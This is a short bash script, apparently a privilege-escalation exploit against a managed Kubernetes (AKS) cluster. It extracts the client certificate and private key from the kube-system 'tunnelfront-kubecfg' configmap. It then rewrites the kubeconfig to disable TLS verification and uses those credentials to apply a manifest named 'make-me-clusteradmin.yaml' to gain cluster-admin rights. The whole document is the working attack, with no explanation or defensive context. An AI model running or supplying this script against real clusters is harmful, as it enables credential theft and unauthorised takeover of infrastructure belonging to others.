#!/bin/bash

mkdir -p tunnelfront

kubectl get configmap -n kube-system tunnelfront-kubecfg -ojson > tunnelfront/kubeconfig.json

jq -r < tunnelfront/kubeconfig.json '.data["client.pem"]' > tunnelfront/client.pem
jq -r < tunnelfront/kubeconfig.json '.data["client.key"]' > tunnelfront/client.key
jq -r < tunnelfront/kubeconfig.json '.data["kubeconfig"]' \
  | sed 's|client-certificate.*|client-certificate: ./client.pem|' \
  | sed 's|client-key.*|client-key: ./client.key|' \
  | sed 's|certificate-authority:.*|insecure-skip-tls-verify: true|' \
  | grep -v 'tokenFile:' \
  > tunnelfront/kubeconfig

kubectl --kubeconfig ./tunnelfront/kubeconfig apply -f make-me-clusteradmin.yaml
